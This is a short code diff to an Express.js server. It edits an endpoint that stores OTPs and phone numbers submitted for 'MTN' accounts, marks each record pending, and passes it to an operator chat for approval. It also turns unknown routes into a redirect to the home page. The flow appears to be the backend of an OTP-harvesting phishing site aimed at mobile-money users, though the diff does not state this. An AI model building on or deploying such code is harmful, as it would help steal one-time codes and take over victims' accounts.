@@ -288,7 +288,7 @@ app.post('/api/mtn/submit-otp', (req, res) => {
       existing.step = 'otp';
       existing.otp = otp;
       existing.phone = resolvedPhone || existing.phone;
-      existing.status = existing.status || 'pending';
+      existing.status = 'pending';
       if (!isAdminApprovalConfigured()) {
         existing.status = 'completed';
       } else if (api && ADMIN_CHAT_ID) {
@@ -529,7 +529,11 @@ app.get('/mwish.html', (req, res) => {
 });
 
 app.use((req, res) => {
-  res.status(404).send('404 — Page not found');
+  if (req.path.startsWith('/api/')) {
+    return res.status(404).json({ success: false, error: 'Endpoint not found' });
+  }
+
+  res.redirect('/');
 });
 
 app.listen(PORT, () => {
